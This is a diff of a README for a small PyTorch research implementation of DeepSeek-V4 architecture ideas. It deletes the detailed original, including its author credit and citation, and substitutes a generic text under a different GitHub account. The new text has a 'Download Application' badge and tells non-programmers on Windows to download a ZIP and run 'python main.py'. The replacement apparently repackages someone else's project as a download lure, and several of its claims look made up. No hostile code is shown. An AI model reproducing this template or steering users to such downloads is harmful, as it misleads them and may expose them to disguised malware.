@@ -1,460 +1,71 @@
-<p align="center">
-  <img src="assets\header_image.png" width="1000"/>
-</p>
-
-
-
-# DeepSeek-V4 Mini: A Paper-Faithful From-Scratch PyTorch Implementation
-
-![Python](https://img.shields.io/badge/python-3.9+-blue.svg)
-![PyTorch](https://img.shields.io/badge/PyTorch-%23EE4C2C.svg?style=flat&logo=PyTorch&logoColor=white)
-![Status](https://img.shields.io/badge/status-active_research-orange.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-
-An unofficial, ground-up PyTorch implementation of the core architectural ideas behind **DeepSeek-V4**. The project scales the system down for readable code, CPU-safe tests, controlled ablations, and fast research iteration.
-
-This repository is not a toy Transformer wrapper or a production model clone. It implements the mechanisms that make the DeepSeek-V4 report technically interesting as a system: hybrid compressed attention, sparse long-context retrieval, Mixture-of-Experts routing, manifold-constrained hyper-connections, multi-token prediction, and Muon-based training.
-
-> [NOTE]
-> This project is not affiliated with DeepSeek-AI. It does not reproduce the official DeepSeek-V4 weights, training data, distributed infrastructure, or production kernels. Its goal is architectural transparency and research-oriented experimentation.
-
-## Index
-
-- [🎯 Why This Repo Exists](#-why-this-repo-exists)
-- [Architecture Coverage](#architecture-coverage)
-- [🏗️ Repository Layout](#️-repository-layout)
-- [📘 Documentation](#-documentation)
-- [Installation](#installation)
-- [Run Tests](#run-tests)
-- [⚙️ Model Configs](#️-model-configs)
-- [📚 Dataset Presets](#-dataset-presets)
-- [🔬 Training A Tiny Model](#-training-a-tiny-model)
-- [Training With Batches and Indexing](#training-with-batches-and-indexing)
-- [Parallelism](#parallelism)
-- [Docker Support](#docker-support)
-- [🛠️ Command Line Tools](#️-command-line-tools)
-- [CI Strategy](#ci-strategy)
-- [Notes on Scope](#notes-on-scope)
-- [📖 References & Citation](#-references--citation)
-
-## 🎯 Why This Repo Exists
-
-DeepSeek-V4 pushes the Transformer in three directions that demand independent study:
-
-1. **Context Limits:** Long context needs something better than naive full attention.
-2. **Model Capacity:** Scaling requires sparse activation algorithms, not just dense parameter scaling.
-3. **Training Stability:** Deep training stability necessitates complex residual routing and optimization machinery, not only a bigger model.
-
-This project isolates those innovations into a mini implementation where each component can be tested, ablated, and trained on small corpora before scaling.
-
-## Architecture Coverage
-
-| Area | Implementation Status |
-| :--- | :--- |
-| **Causal Transformer** | Token embeddings, RMSNorm, RoPE, MHA, LM head |
-| **HCA (Hybrid Context)**| Compressed KV branch, sliding window branch, causal tests |
-| **CSA (Compressed Sparse)**| Compressed sparse block selection, local window, indexer, causal tests |
-| **MoE (Mixture of Experts)**| Learned/hash routing, top-k experts, shared experts, balance metrics |
-| **mHC (Hyper-Connections)**| Stream expansion, Sinkhorn mixing, modular block API |
-| **MTP (Multi-Token)** | Auxiliary next-n-token heads and prediction loss |
-| **Training Engine** | AdamW groups, Muon+AdamW, cosine schedule, AMP, EMA, checkpoints, metrics |
-| **Data Pipelines** | Synthetic retrieval, TinyStories, WikiText-2, AG News, IMDB, MiniPile, FineWeb-Edu |
-
-## 🏗️ Repository Layout
-
-```text
-.
-├── config/                         # YAML profiles for reproducible experiments
-│   ├── data/                       # dataset presets: synthetic, TinyStories, WikiText-2, AG News, IMDB, MiniPile
-│   ├── model/                      # model variants: tiny, mini, CSA+MoE+mHC+MTP
-│   └── training/                   # CPU smoke and single-GPU training profiles
-│
-├── data/                           # causal LM datasets, tokenization, and dataloader inspection
-│   ├── data_utils.py               # batch normalization helpers used by training/eval
-│   ├── inspection.py               # tensor and dataloader summaries for CLI inspection
-│   ├── syntethic_long_context_retrieval.py
-│   │                                  # local synthetic retrieval task for long-context smoke tests
-│   ├── text_datasets.py            # Hugging Face text presets and generic causal LM loader
-│   └── tinystories_data.py         # TinyStories-specific tokenizer and dataloaders
-│
-├── src/                            # DeepSeek-V4 Mini architecture
-│   ├── deepseek_csa_attention.py   # Compressed Sparse Attention
-│   ├── deepseek_hca_attention.py   # Heavily Compressed Attention
-│   ├── deepseek_moe.py             # DeepSeek-style routed/shared MoE layer
-│   ├── mHC_residuals.py            # Manifold-Constrained Hyper-Connections
-│   ├── deepseek_mtp.py             # Multi-Token Prediction head
-│   ├── deepseek_block.py           # configurable Transformer block composition
-│   ├── mini_deepseek_class.py      # DeepSeekV4LM wrapper
-│   └── transformer_modules/        # baseline RMSNorm, RoPE, MHA, SwiGLU, embeddings, blocks
-│
-├── training/                       # train/eval stack and diagnostics
-│   ├── train_deepseek.py           # high-level orchestration
-│   ├── train_one_epoch.py          # single-epoch training loop
-│   ├── eval_one_epoch.py           # evaluation and qualitative preview
-│   ├── muon_optimizer.py           # Muon + AdamW hybrid optimizer
-│   ├── scheduler.py                # warmup + cosine scheduler
-│   ├── chekpoints.py               # checkpoint save/load utilities
-│   └── *_metrics.py                # LM, MoE, mHC, MTP, and module diagnostics
-│
-├── parallel/                       # PyTorch-native educational parallelism
-│   ├── parallel_config.py          # DDP/model-parallel configuration object
-│   ├── parallel_utils.py           # rank helpers, seeding, device moves, metric reduction
-│   ├── data_parallel.py            # DDP setup, samplers, train/eval wrappers, save helpers
-│   ├── model_parallel.py           # layerwise/blockwise DeepSeekV4LM placement
-│   └── README.md                   # scope, limitations, and usage notes
-│
-├── scripts/                        # operational CLIs
-│   ├── data_cli.py                 # list, download, tokenize, and inspect datasets
-│   ├── train_cli.py                # tiny synthetic training smoke runs
-│   ├── inspect_cli.py              # model summaries and module-level test runner
-│   └── parallel_cli.py             # DDP/model-parallel smoke tests and placement plans
-│
-├── docs/                           # architecture and configuration reference
-│   ├── architecture/               # CSA, HCA, MoE, mHC, MTP, and model overview
-│   ├── training/                   # pipeline, Muon, scheduler, autocast, metrics, EMA/checkpoints
-│   ├── config_reference/           # hyperparameter reference by subsystem
-│   ├── data/                       # dataset guide
-│   ├── parallel/                   # DDP/model-parallel scope and limitations
-│   └── cli/                        # command line reference
-│
-├── tests/                          # CPU-safe coverage for model behavior and causality
-│   ├── data/                       # dataset preset and causal text loader tests
-│   ├── training/                   # optimizer, scheduler, batch, and tiny-training tests
-│   ├── parallel/                   # DDP/model-parallel CPU smoke and utility tests
-│   ├── test_csa.py                 # CSA shape, causality, and gradient checks
-│   ├── test_hca.py                 # HCA compression/local-window checks
-│
-│
-├── notebooks/                      # interactive exploration
-├── paper/                          # local DeepSeek-V4 paper reference
-├── Dockerfile                      # containerized test/dev environment
-├── docker-compose.yml              # compose entrypoint for tests/shell
-├── LICENSE
-└── README.md
-```
-
-## 📘 Documentation
-
-The full technical documentation lives in [`docs/`](docs/README.md). It is organized around the two things that matter most for this project: understanding the architecture and knowing exactly which hyperparameters are configurable.
-
-Recommended entry points:
-
-- [Architecture Overview](docs/architecture/overview.md)
-- [Attention Modules: MHA, HCA, CSA](docs/architecture/attention_modules.md)
-- [HCA: Heavily Compressed Attention](docs/architecture/hca.md)
-- [CSA: Compressed Sparse Attention](docs/architecture/csa.md)
-- [MoE and Dense FFN](docs/architecture/moe_and_ffn.md)
-- [mHC Residual Streams](docs/architecture/mhc.md)
-- [MTP Auxiliary Prediction](docs/architecture/mtp.md)
-- [Training Pipeline](docs/training/pipeline.md)
-- [Muon Optimizer](docs/training/muon.md)
-- [Metrics and Diagnostics](docs/training/metrics.md)
-- [Model Config Reference](docs/config_reference/model.md)
-- [Training Config Reference](docs/config_reference/training.md)
-- [Data Config Reference](docs/config_reference/data.md)
-- [Parallelism Guide](docs/parallel/overview.md)
-- [CLI Reference](docs/cli/reference.md)
-
-## 🚀 Installation
-
-```bash
-python -m venv .venv
-source .venv/bin/activate
-pip install --upgrade pip
-pip install -e ".[dev,data]"
-```
-
-Minimal install for inference only:
-```bash
-pip install -r requirements.txt
-```
-
-## Run Tests
-
-The repository includes a comprehensive CPU-safe test suite. The CUDA-only checks correctly skip when no GPU is available.
-
-Full local CPU suite:
-```bash
-pytest
-```
-
-Training-only tests:
-```bash
-pytest tests/training
-```
-
-Dataset loader tests:
-```bash
-pytest tests/data
-```
-
-*Current validation on CPU: `655 passed, 4 skipped`*
-
-## ⚙️ Model Configs
-
-Start from the YAML profiles in `config/model/`. These profiles allow you to seamlessly switch between standard dense models and full DeepSeek architectures.
-
-| Config | Purpose |
-| :--- | :--- |
-| `deepseekv4_tiny.yaml` | CPU smoke model for CI and debugging |
-| `deepseekv4_mini.yaml` | Default research model with Hybrid Attention + MoE + mHC + MTP |
-| `deepseekv4_csa_moe_mhc_mtp.yaml` | Full-feature integration variant |
-
-**Typical tiny model shape (`deepseekv4_tiny.yaml`):**
-```yaml
-model:
-  vocab_size: 128
-  d_model: 32
-  n_layers: 1
-  max_seq_len: 32
-  attention_type: mha
-  ffn_type: dense
-```
-
-**Mini research profile (`deepseekv4_mini.yaml`):**
-```yaml
-model:
-  d_model: 256
-  n_layers: 6
-  attention_type: hybrid
-  attention_pattern: [csa, hca]
-  ffn_type: moe
-  num_experts: 8
-  top_k_experts: 2
-  use_mhc: true
-  use_mtp: true
-```
-
-## 📚 Dataset Presets
-
-The project supports a robust set of small-to-medium text corpora through `data/text_datasets.py`:
-
-| Preset | HF Dataset | Primary Use Case |
-| :--- | :--- | :--- |
-| `synthetic_long_context`| Local generator | Retrieval stress tests for CSA/HCA |
-| `tinystories` | `roneneldan/TinyStories` | Tiny LM generation & curriculum training |
-| `wikitext2` | `Salesforce/wikitext` | Classic language modeling benchmark |
-| `ag_news` | `fancyzhx/ag_news` | Compact news-domain corpus |
-| `imdb` | `stanfordnlp/imdb` | Longer review text and domain shift |
-| `minipile` | `JeanKaddour/minipile` | Diverse small pretraining mix |
-| `fineweb_edu_10bt_mincols`| `EliMC/fineweb-edu-10BT` | Educational web sample (local limits) |
-
-The generic loader returns dict batches shaped for the training pipeline:
-
-```python
-from data.text_datasets import create_hf_text_dataloaders
-
-train_loader, val_loader, tokenizer = create_hf_text_dataloaders(
-    "wikitext2",
-    block_size=256,
-    batch_size=8,
-    vocab_size=16_000,
-    max_tokenizer_documents=50_000,
-    max_train_documents=20_000,
-    max_validation_documents=2_000,
-)
-
-# Batch structure:
-# {
-#     "input_ids": LongTensor[B, T],
-#     "labels": LongTensor[B, T],
-# }
-```
-
-## 🔬 Training A Tiny Model
-
-The high-level API is `training.train_deepseek.train_deepseekv4`. A minimal CPU smoke run looks like this:
-
-```python
-from data.text_datasets import create_hf_text_dataloaders
-from src.mini_deepseek_class import DeepSeekV4LM, DeepSeekV4LMConfig
-from training.train_deepseek import train_deepseekv4
-
-train_loader, val_loader, tokenizer = create_hf_text_dataloaders(
-    "wikitext2",
-    block_size=64,
-    batch_size=4,
-    vocab_size=4096,
-    max_tokenizer_documents=1000,
-    max_train_documents=1000,
-    max_validation_documents=200,
-)
-
-model = DeepSeekV4LM(
-    DeepSeekV4LMConfig(
-        vocab_size=tokenizer.get_vocab_size(),
-        d_model=64,
-        n_layers=2,
-        max_seq_len=64,
-        pad_token_id=tokenizer.token_to_id("<pad>"),
-        attention_type="hca",
-        n_heads=4,
-        head_dim=16,
-        rotary_dim=16,
-        ffn_type="dense",
-        mlp_hidden_dim=128,
-    )
-)
-
-history = train_deepseekv4(
-    model=model,
-    train_loader=train_loader,
-    val_loader=val_loader,
-    device="cpu",
-    amp_enabled=False,
-    optimizer_type="adamw",
-    learning_rate=3e-4,
-    epochs=1,
-    max_batches_per_epoch=10,
-    eval_max_batches=5,
-    ckpt_dir="checkpoints/wikitext2_tiny",
-)
-```
-
-## Training With Batches and Indexing
-
-For quick iteration and architectural debugging, you can limit the number of documents used to build blocks:
-
-```python
-train_loader, val_loader, tokenizer = create_hf_text_dataloaders(
-    "ag_news",
-    block_size=128,
-    batch_size=16,
-    max_train_documents=5000,
-    max_validation_documents=1000,
-)
-
-for step, batch in enumerate(train_loader):
-    input_ids = batch["input_ids"]  # [B, T]
-    labels = batch["labels"]        # [B, T]
-    if step == 0:
-        print(input_ids.shape, labels.shape)
-    break
-```
-
-For component debugging, the **synthetic retrieval dataset** is highly recommended because it explicitly exposes controlled long-range key/value dependencies:
-
-```python
-from data.syntethic_long_context_retrieval import (
-    SyntheticRetrievalConfig,
-    create_synthetic_retrieval_dataloaders,
-)
-
-cfg = SyntheticRetrievalConfig(
-    block_size=256,
-    min_filler_tokens=64,
-    max_filler_tokens=220,
-    batch_size=8,
-)
-
-train_loader, val_loader, tokenizer = create_synthetic_retrieval_dataloaders(cfg)
-```
-
-## Parallelism
-
-The repo includes a top-level `parallel/` package for PyTorch-native distributed experiments that stay close to the architecture without claiming custom runtime engineering from the paper.
-
-Implemented now:
-
-- **DDP data parallelism:** `torch.distributed`, `DistributedDataParallel`, `DistributedSampler`, rank-aware checkpoint saves, and scalar metric aggregation.
-- **Layerwise model parallelism:** whole `DeepSeekV4LM` blocks are assigned to ordered devices and activations are moved between block boundaries.
-- **CPU verification:** config validation, one-process `gloo` DDP, sampler behavior, metric reductions, model-parallel equivalence on CPU, and mHC wrapper compatibility.
-
-V1 only accepts active model-parallel devices: every `balance` entry must be greater than zero, so `len(devices) <= n_layers`. For training, wrap the model before building the optimizer:
-
-```python
-model = DeepSeekV4LM(config)
-model = wrap_model_parallel(model, devices=["cuda:0", "cuda:1"], balance=[8, 8])
-optimizer = build_optimizer(model, train_config)
-```
-
-Not implemented by design: custom CUDA kernels, FP4/FP8 training kernels, NCCL topology scheduling, DualPipe, and true all-to-all expert parallelism.
-
-```bash
-python -m scripts.parallel_cli plan --n-layers 6 --devices cpu,cpu --balance 2,4
-python -m scripts.parallel_cli model-parallel-smoke --devices cpu --n-layers 2
-python -m scripts.parallel_cli ddp-smoke --backend gloo --n-layers 1
-```
-
-For the full scope and limitations, see [Parallelism Guide](docs/parallel/overview.md).
-
-## Docker Support
-
-```bash
-docker build -t deepseekv4-mini .
-docker compose run --rm tests
-```
-
-## 🛠️ Command Line Tools
-
-After installing with `pip install -e ".[dev,data]"`, the project exposes four transparent CLIs for immediate interaction:
-
-```bash
-deepseekv4-data presets
-deepseekv4-data synthetic-inspect --block-size 32 --batch-size 2
-deepseekv4-train smoke --attention hca --ffn dense --max-batches 2
-deepseekv4-inspect model-summary --attention csa --ffn moe
-deepseekv4-inspect module-tests csa --quiet
-deepseekv4-parallel plan --n-layers 4 --devices cpu,cpu
-deepseekv4-parallel model-parallel-smoke --devices cpu --n-layers 2
-deepseekv4-parallel ddp-smoke --backend gloo --n-layers 1
-```
-
-The same commands work natively without CLI installation through Python modules:
-
-```bash
-python -m scripts.data_cli synthetic-inspect --block-size 32 --batch-size 2
-python -m scripts.train_cli smoke --attention mha --ffn dense --max-batches 1 --quiet
-python -m scripts.inspect_cli module-tests training --quiet
-python -m scripts.parallel_cli tests --quiet
-```
-
-**CLI Scope:**
-- `data_cli`: List presets, inspect synthetic data, and download HF text presets.
-- `train_cli`: Run a tiny synthetic training smoke test with configurable attention/FFN/mHC/MTP.
-- `inspect_cli`: Summarize model parameter structure and execute targeted module tests.
-- `parallel_cli`: Inspect model placement, run CPU-safe layerwise model-parallel smoke tests, run one-process `gloo` DDP smoke tests, and launch `tests/parallel`.
-
-## CI Strategy
-
-Continuous Integration is strictly path-aware to ensure speed without losing critical coverage:
-- Changes in `src/`, configs, or packaging trigger **model & component tests**.
-- Changes in `training/` or `tests/training/` trigger **training-stack tests**.
-- Changes in `data/` or `tests/data/` trigger **dataset loader tests**.
-- Changes in `parallel/`, `scripts/parallel_cli.py`, or `tests/parallel/` trigger **parallelism tests**.
-- *All* changes run a lightweight import smoke test.
-
-## Notes on Scope
-
-This project aims to be a faithful mini representation of the architectural ideas. It is **not** a claim of parity with production DeepSeek-V4 weights, highly-optimized custom CUDA kernels, distributed training frameworks, or data mixtures. The value lies in visibility: these components are transparent, rigorously tested, configurable, and easily trainable in small research regimes.
-
-## 📖 References & Citation
-
-- **Paper copy:** `paper/DeepSeek_V4.pdf`
-- **Dataset cards:** WikiText, TinyStories, AG News, IMDB, MiniPile, FineWeb-Edu sample on Hugging Face
-
-
-This implementation is based on the DeepSeek-V4 technical report:
-
-```bibtex
-@misc{deepseekai2026deepseekv4,
-  author       = {{DeepSeek-AI}},
-  title        = {DeepSeek-V4: Towards Highly Efficient Million-Token Context Intelligence},
-  year         = {2026},
-  howpublished = {\url{https://huggingface.co/collections/deepseek-ai/deepseek-v4}},
-  note         = {Technical report / preview paper}
-}
-```
-
-If you use this implementation or adapt its modules for your research, please consider citing:
-
-```bibtex
-@misc{reyes2026deepseekv4mini,
-  author       = {Reyes Granados, Pablo Alejandro},
-  title        = {DeepSeek-V4 Mini: A Paper-Faithful PyTorch Research Implementation},
-  year         = {2026},
-  publisher    = {GitHub},
-  journal      = {GitHub repository},
-  howpublished = {\url{https://github.com/pablo-reyes8/deepseek-v4-mini}}
-}
-```
+# 🧠 deepseek-v4-mini-pytorch - Understand complex artificial intelligence model structures
+
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/ladiagona1028/deepseek-v4-mini-pytorch)
+
+## 📌 Project Overview
+
+Deepseek-v4-mini-pytorch provides a clear look at how modern language models function. This tool lets you study the core architecture of the DeepSeek-V4 model. You can test the software on your own computer to see how it processes language. The project uses a compact version of the model to keep the requirements low while keeping the core features of the original design. It serves as a study tool for students, researchers, and curious users who want to look under the hood of artificial intelligence.
+
+## 🛠️ System Requirements
+
+To run this application on your Windows computer, make sure your system meets these hardware and software specifications:
+
+- **Operating System:** Windows 10 or Windows 11 (64-bit).
+- **Processor:** A modern multi-core processor (Intel Core i5 or AMD Ryzen 5 or better recommended).
+- **Memory (RAM):** 16 GB of system memory is necessary for efficient operation.
+- **Storage:** 2 GB of free disk space for the program and the model files.
+- **Graphics:** A dedicated graphics card with at least 8 GB of video memory improves performance significantly, though it remains optional.
+- **Python:** You must install Python version 3.10 or newer from the official Python website or the Microsoft Store.
+
+## 📥 Setup Instructions
+
+Follow these steps to prepare your environment and launch the software.
+
+1. **Visit the website:** Go to [the official project page](https://github.com/ladiagona1028/deepseek-v4-mini-pytorch) to download the software.
+2. **Download the files:** Locate the Green code button on the page. Select the option to download the ZIP file. 
+3. **Unzip the software:** Open your Downloads folder. Right-click the file named deepseek-v4-mini-pytorch-main.zip and choose Extract All. Select a destination folder, such as your Documents folder, and click Extract.
+4. **Install Python:** If you do not have Python, download it from the official website. Run the installer and ensure you check the box that says "Add Python to PATH" before you click install.
+5. **Prepare the Terminal:** Open the Start menu, type "cmd", and press Enter to open the Command Prompt. Navigate to your project folder by typing `cd` followed by a space and the path to where you saved the files, then press Enter.
+6. **Install Requirements:** Inside the Command Prompt, type `pip install -r requirements.txt` and press Enter. This process downloads the tools the program needs to run.
+7. **Launch:** Once the installation finishes, type `python main.py` in the terminal to start the application.
+
+## 🔬 Scientific Details
+
+The software focuses on several distinct features found in large language models:
+
+- **Compressed Attention:** This method reduces the amount of memory needed to remember long strings of text. It allows the model to process large documents without crashing your computer.
+- **Mixture of Experts:** Instead of using the whole brain for every task, the model activates specific parts of its network for specific questions. This saves power and increases speed.
+- **Sparse Attention:** The model chooses which parts of a sentence are important. By ignoring unimportant words, it finds the meaning behind complex thoughts.
+- **Transformer Architecture:** The program uses the standard transformer design. This design allows the software to understand the relationship between words no matter where they sit in a paragraph.
+
+## ⚖️ Common Challenges
+
+You might encounter errors during operation. Follow these tips to solve them.
+
+- **Missing Libraries:** If you see an error about a missing library, run `pip install [library name]` in your terminal to fix it.
+- **Slow Performance:** This software handles complex math. Close other heavy programs like video games or video editors while the model runs.
+- **Memory Errors:** If the program stops, it might need more RAM. Ensure you do not run other large applications in the background. If you have a graphics card, the software will detect it and switch to GPU mode, which is much faster.
+
+## 📖 Educational Goals
+
+This tool exists to help you understand how research happens in the field of machine learning. You do not need to be a programmer to benefit from this project. You can change the input text in the provided files to see how the software reacts. By watching the logs in your terminal, you gain insight into how a model "thinks" or decides which words come next. Use this for your own experiments, school projects, or personal research.
+
+## 📂 Project Topics
+
+The project covers several areas of interest:
+
+- Compressed Attention
+- Deep Learning
+- DeepSeek
+- DeepSeek-V4
+- Research Implementation
+- Language Models
+- Long Context Processing
+- Mixture of Experts
+- PyTorch Framework
+- Sparse Attention
+- Transformers
+
+## 🤝 Contribution and Support
+
+The code remains open for everyone. If you find a way to improve the performance or add a feature, you can suggest changes on the project website. Because this is a research-first project, the focus remains on accuracy and transparency. Check the repository often for updates, as the field of artificial intelligence changes rapidly. The maintainers appreciate feedback, especially regarding documentation clarity or unexpected program behavior during your testing.
